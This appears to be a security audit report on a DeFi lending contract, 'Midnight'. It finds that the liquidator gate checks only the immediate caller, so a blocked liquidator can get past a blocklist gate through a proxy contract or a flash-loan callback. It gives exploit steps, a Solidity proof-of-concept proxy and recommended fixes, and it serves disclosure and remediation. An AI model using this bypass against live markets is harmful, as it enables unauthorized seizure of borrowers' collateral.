Audit Report

## Title
Liquidator gate bypass via any unblocked intermediary contract — (`src/Midnight.sol`)

## Summary
`Midnight.liquidate()` enforces the `liquidatorGate` by calling `canLiquidate(msg.sender)`, where `msg.sender` is the immediate caller. For any blocklist-based gate implementation, a blocked address can trivially bypass this check by routing the call through any contract not yet on the blocklist — including a purpose-deployed proxy or a flash loan callback. The gate never observes the original initiator's address, so the restriction is fully circumvented and seized collateral is transferred to an attacker-controlled `receiver`.

## Finding Description

**Root cause:** `liquidate()` at lines 597–600 of `src/Midnight.sol` checks only `msg.sender`:

```solidity
require(
    market.liquidatorGate == address(0) || ILiquidatorGate(market.liquidatorGate).canLiquidate(msg.sender),
    LiquidatorGatedFromLiquidating()
);
```

`ILiquidatorGate` (defined in `src/interfaces/IGate.sol` lines 10–12) exposes only `canLiquidate(address account)` — a single address with no call-origin context. There is no `tx.origin` check, no transitive identity propagation, and no mechanism to surface the ultimate beneficiary to the gate.

**Exploit path A — direct intermediary (simplest):**
1. Attacker (blocked by a blocklist gate) deploys `ProxyLiquidator`, a fresh contract address not yet on the blocklist.
2. `ProxyLiquidator.execute()` calls `Midnight.liquidate(..., receiver=attacker, ...)`.
3. Gate evaluates `canLiquidate(ProxyLiquidator)` → not on blocklist → `true`.
4. Liquidation succeeds; collateral is sent to `attacker`.

**Exploit path B — flash loan callback:**
1. Attacker calls `Midnight.flashLoan([], [], callbackContract, data)` — empty arrays satisfy `tokens.length == assets.length` (line 740); the transfer loop (lines 742–744) is a no-op, but `onFlashLoan` is still invoked at line 746.
2. Inside `onFlashLoan`, `msg.sender` is `Midnight`; `callbackContract` calls `Midnight.liquidate(..., receiver=attacker, ...)`.
3. Gate evaluates `canLiquidate(callbackContract)` → not on blocklist → `true`.
4. Liquidation succeeds.

Both paths exploit the same root cause. Path A requires no flash loan at all.

**Why existing checks fail:** The gate interface (`IGate.sol` lines 10–12) accepts only one address argument. The protocol passes `msg.sender` (the immediate caller). A blocklist gate cannot enumerate every future contract an attacker might deploy; each new address is unblocked by default. The protocol's own `live_context.json` (lines 302–308) lists `liquidator_gate_bypass` as a test scenario — "attempt liquidation through alternate actor/callback/authorized address, assert only approved liquidator can liquidate" — but the existing test suite (`test/GateTest.sol` lines 269–300) only exercises a whitelist gate via a direct EOA call, leaving the intermediary-contract path untested.

## Impact Explanation
A blocked liquidator seizes collateral from a liquidatable borrower and directs it to an attacker-controlled `receiver` (line 696). This constitutes direct, unauthorized movement of user assets. The gate's intended access control is rendered ineffective for any blocklist-based implementation. Severity is high: asset theft is concrete and immediate once a liquidatable position exists.

## Likelihood Explanation
Preconditions are minimal: (1) a market with a blocklist-based `liquidatorGate` exists, (2) a liquidatable borrower exists, and (3) the attacker can deploy a new contract (zero cost beyond gas). The attack is repeatable — each new contract address is unblocked by default, so blocklisting the proxy does not stop the attacker from deploying another. No privileged access, leaked keys, or victim cooperation is required.

## Recommendation
**Preferred fix — mandate whitelist semantics and document the constraint:** The protocol should explicitly document (in the `GATES` section of `Midnight.sol` and in `IGate.sol`) that `ILiquidatorGate` implementations must use a whitelist pattern (i.e., `canLiquidate` returns `true` only for explicitly approved addresses). A whitelist gate is immune to this bypass because any intermediary contract the attacker deploys is also not whitelisted.

**Alternative fix — extend the gate interface with origin context:** Add an overload or replace the current signature with `canLiquidate(address caller, address origin)` so gate implementations can enforce policy on `tx.origin` or on a caller-supplied identity. This is more complex and introduces its own trust assumptions.

**Do not rely on `tx.origin` alone** in the core protocol check — it breaks smart-contract liquidator integrations.

## Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {IMidnight, Market} from "src/interfaces/IMidnight.sol";
import {IFlashLoanCallback} from "src/interfaces/IFlashLoanCallback.sol";

/// Blocklist gate: blocks a specific address, allows everyone else.
contract BlocklistGate {
    mapping(address => bool) public blocked;
    function block_(address a) external { blocked[a] = true; }
    function canLiquidate(address a) external view returns (bool) { return !blocked[a]; }
}

/// Intermediary: not on the blocklist, calls liquidate on behalf of attacker.
contract ProxyLiquidator {
    IMidnight immutable midnight;
    constructor(address _midnight) { midnight = IMidnight(_midnight); }

    function doLiquidate(
        Market calldata market,
        uint256 collateralIndex,
        address borrower,
        address receiver
    ) external {
        // msg.sender here is ProxyLiquidator — not on the blocklist → gate passes
        midnight.liquidate(market, collateralIndex, 1, 0, borrower, false, receiver, address(0), "");
    }
}

// Test steps:
// 1. Deploy BlocklistGate; call block_(attacker).
// 2. Create market with liquidatorGate = address(blocklistGate).
// 3. Create a liquidatable borrower position.
// 4. Deploy ProxyLiquidator (fresh address, not blocked).
// 5. attacker calls ProxyLiquidator.doLiquidate(..., receiver=attacker).
// 6. Assert: liquidation succeeds and attacker receives seized collateral.
// 7. Assert: direct call from attacker to midnight.liquidate() reverts with LiquidatorGatedFromLiquidating.
``` [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) [5](#0-4) [6](#0-5)

### Citations

**File:** src/Midnight.sol (L127-132)
```text
/// GATES
/// @dev Gates are optional (address(0) = unrestricted).
/// @dev The entry gate can prevent increasing credit or debt in the market.
/// @dev In particular, it does not prevent the user from exiting the market even when the entry gate is reverting.
/// @dev The liquidator gate can prevent the user from liquidating borrowers in the market (and realizing bad debt).
///
```

**File:** src/Midnight.sol (L597-600)
```text
        require(
            market.liquidatorGate == address(0) || ILiquidatorGate(market.liquidatorGate).canLiquidate(msg.sender),
            LiquidatorGatedFromLiquidating()
        );
```

**File:** src/Midnight.sol (L696-696)
```text
        SafeTransferLib.safeTransfer(market.collateralParams[collateralIndex].token, receiver, seizedAssets);
```

**File:** src/Midnight.sol (L737-752)
```text
    function flashLoan(address[] calldata tokens, uint256[] calldata assets, address callback, bytes calldata data)
        external
    {
        require(tokens.length == assets.length, InconsistentInput());
        emit EventsLib.FlashLoan(msg.sender, tokens, assets, callback);
        for (uint256 i = 0; i < tokens.length; i++) {
            SafeTransferLib.safeTransfer(tokens[i], callback, assets[i]);
        }
        require(
            IFlashLoanCallback(callback).onFlashLoan(msg.sender, tokens, assets, data) == CALLBACK_SUCCESS,
            WrongFlashLoanCallbackReturnValue()
        );
        for (uint256 i = 0; i < tokens.length; i++) {
            SafeTransferLib.safeTransferFrom(tokens[i], callback, address(this), assets[i]);
        }
    }
```

**File:** src/interfaces/IGate.sol (L10-12)
```text
interface ILiquidatorGate {
    function canLiquidate(address account) external view returns (bool);
}
```

**File:** test/GateTest.sol (L269-300)
```text
    function testLiquidatorGateOnLiquidation(uint256 units, bool isWhitelisted) public {
        units = bound(units, 1, MAX_TEST_AMOUNT * 3 / 4);
        gate.setWhitelisted(lender, true);
        gate.setWhitelisted(borrower, true);
        gate.setWhitelisted(liquidator, isWhitelisted);

        collateralize(gatedMarket, borrower, units);
        take(units, lender, borrowerOffer);

        Oracle(gatedMarket.collateralParams[0].oracle).setPrice(ORACLE_PRICE_SCALE / 2);

        deal(address(loanToken), liquidator, units);
        vm.prank(liquidator);
        if (!isWhitelisted) vm.expectRevert(IMidnight.LiquidatorGatedFromLiquidating.selector);
        midnight.liquidate(gatedMarket, 0, 1, 0, borrower, false, address(this), address(0), "");
    }

    function testLiquidatorGateOnBadDebt(uint256 units, bool isWhitelisted) public {
        units = bound(units, 1, MAX_TEST_AMOUNT * 3 / 4);
        gate.setWhitelisted(lender, true);
        gate.setWhitelisted(borrower, true);
        gate.setWhitelisted(liquidator, isWhitelisted);

        collateralize(gatedMarket, borrower, units);
        take(units, lender, borrowerOffer);

        Oracle(gatedMarket.collateralParams[0].oracle).setPrice(0);

        vm.prank(liquidator);
        if (!isWhitelisted) vm.expectRevert(IMidnight.LiquidatorGatedFromLiquidating.selector);
        midnight.liquidate(gatedMarket, 0, 0, 0, borrower, false, address(this), address(0), "");
    }
```
